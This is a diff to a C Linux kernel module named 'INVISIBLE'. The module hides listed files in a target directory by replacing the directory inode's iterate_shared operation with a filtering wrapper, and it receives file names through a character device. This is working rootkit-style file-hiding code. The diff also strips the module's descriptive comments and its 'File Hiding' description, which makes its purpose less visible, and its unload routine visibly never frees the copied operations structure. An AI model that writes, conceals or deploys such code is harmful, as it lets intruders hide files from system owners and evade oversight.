@@ -17,7 +17,7 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("LAVRENTEV YFIM");
-MODULE_DESCRIPTION("INVISIBLE - VFS Interception Driver for File Hiding");
+MODULE_DESCRIPTION("INVISIBLE");
 MODULE_VERSION("1.0");
 
 struct file_to_hide {
@@ -25,24 +25,20 @@ struct file_to_hide {
     char file_name[NAME_SIZE];
 };
 
-/* VFS interception structures */
 static const struct file_operations *original_fops = NULL;
 static int (*original_iterate_shared)(struct file *, struct dir_context *) = NULL;
 static struct inode *target_inode = NULL;
 
-/* Global variables */
 static LIST_HEAD(hidden_list);
 static DEFINE_RWLOCK(list_lock);
 static int major_num;
 static struct class *my_class;
 
-/* Helper structure for passing data between iterate and filldir */
 struct my_dir_context {
     struct dir_context ctx;
     struct dir_context *original_ctx;
 };
 
-/* Custom filldir function - filters hidden files */
 static bool my_filldir(struct dir_context *ctx, const char *name,
                       int namelen, loff_t offset, u64 ino, unsigned d_type)
 {
@@ -50,7 +46,6 @@ static bool my_filldir(struct dir_context *ctx, const char *name,
     struct my_dir_context *my_ctx = container_of(ctx, struct my_dir_context, ctx);
     int is_hidden = 0;
     
-    /* Check if file is in hidden list */
     read_lock(&list_lock);
     list_for_each_entry(item, &hidden_list, list) {
         if (strncmp(item->file_name, name, namelen) == 0 && 
@@ -60,37 +55,30 @@ static bool my_filldir(struct dir_context *ctx, const char *name,
         }
     }
     read_unlock(&list_lock);
-    
-    /* Skip hidden files */
+
     if (is_hidden) {
-        return true; /* Continue iteration but skip this file */
+        return true;
     }
     
-    /* Call original filldir for normal files */
     return my_ctx->original_ctx->actor(my_ctx->original_ctx, name, namelen, offset, ino, d_type);
 }
 
-/* Custom iterate_shared function */
 static int my_iterate_shared(struct file *file, struct dir_context *ctx)
 {
     struct my_dir_context my_ctx;
     int result;
     
-    /* Setup our context */
     my_ctx.original_ctx = ctx;
     my_ctx.ctx.actor = my_filldir;
     my_ctx.ctx.pos = ctx->pos;
     
-    /* Call original iterate_shared with our context */
     result = original_iterate_shared(file, &my_ctx.ctx);
     
-    /* Restore position */
     ctx->pos = my_ctx.ctx.pos;
     
     return result;
 }
 
-/* Setup VFS interception */
 static int setup_vfs_interception(void)
 {
     struct path path;
@@ -99,7 +87,6 @@ static int setup_vfs_interception(void)
     
     printk(KERN_INFO "Setting up VFS interception for %s\n", TARGET_DIR);
     
-    /* Get path to target directory */
     ret = kern_path(TARGET_DIR, LOOKUP_FOLLOW, &path);
     if (ret) {
         printk(KERN_ERR "Failed to get path for %s: %d\n", TARGET_DIR, ret);
@@ -108,7 +95,6 @@ static int setup_vfs_interception(void)
     
     target_inode = path.dentry->d_inode;
     
-    /* Save original operations */
     original_fops = target_inode->i_fop;
     if (!original_fops) {
         printk(KERN_ERR "No file operations for target directory\n");
@@ -121,40 +107,33 @@ static int setup_vfs_interception(void)
         return -ENOENT;
     }
     
-    /* Create copy of file operations */
     new_fops = kmalloc(sizeof(struct file_operations), GFP_KERNEL);
     if (!new_fops) {
         printk(KERN_ERR "Failed to allocate memory for new file operations\n");
         return -ENOMEM;
     }
     
-    /* Copy original operations and replace iterate_shared */
     memcpy(new_fops, original_fops, sizeof(struct file_operations));
     new_fops->iterate_shared = my_iterate_shared;
     
-    /* Replace file operations */
     target_inode->i_fop = new_fops;
     
     printk(KERN_INFO "VFS interception successfully set up for %s\n", TARGET_DIR);
     return 0;
 }
 
-/* Restore original VFS operations */
 static void restore_vfs_operations(void)
 {
     if (target_inode && original_fops) {
-        /* Restore original file operations */
         target_inode->i_fop = original_fops;
         printk(KERN_INFO "Original VFS operations restored\n");
     }
     
-    /* Free allocated file operations */
     if (target_inode && target_inode->i_fop != original_fops) {
         kfree(target_inode->i_fop);
     }
 }
 
-/* Character device functions */
 static int my_open(struct inode *node, struct file *file)
 {
     return 0;
@@ -295,7 +274,6 @@ static int __init my_module_start(void)
     
     INIT_LIST_HEAD(&hidden_list);
     
-    /* Register character device */
     ret = register_chrdev(0, MY_DEVICE, &my_fops);
     if (ret < 0) {
         printk(KERN_ERR "Cannot register device: %d\n", ret);
@@ -304,7 +282,6 @@ static int __init my_module_start(void)
     
     major_num = ret;
     
-    /* Create device class */
     my_class = class_create(MY_DEVICE);
     if (IS_ERR(my_class)) {
         printk(KERN_ERR "Cannot create device class\n");
@@ -312,7 +289,6 @@ static int __init my_module_start(void)
         return PTR_ERR(my_class);
     }
     
-    /* Create device */
     dev = device_create(my_class, NULL, MKDEV(major_num, 0), NULL, MY_DEVICE);
     if (IS_ERR(dev)) {
         printk(KERN_ERR "Cannot create device\n");
@@ -321,7 +297,6 @@ static int __init my_module_start(void)
         return PTR_ERR(dev);
     }
     
-    /* Setup VFS interception */
     ret = setup_vfs_interception();
     if (ret) {
         printk(KERN_ERR "Failed to setup VFS interception: %d\n", ret);
@@ -347,10 +322,8 @@ static void __exit my_module_end(void)
     
     printk(KERN_INFO "Unloading VFS file hider\n");
     
-    /* Restore VFS operations */
     restore_vfs_operations();
     
-    /* Clean up hidden files list */
     write_lock(&list_lock);
     list_for_each_entry_safe(item, temp, &hidden_list, list) {
         list_del(&item->list);
@@ -359,7 +332,6 @@ static void __exit my_module_end(void)
     }
     write_unlock(&list_lock);
     
-    /* Remove device and class */
     device_destroy(my_class, MKDEV(major_num, 0));
     class_destroy(my_class);
     unregister_chrdev(major_num, MY_DEVICE);
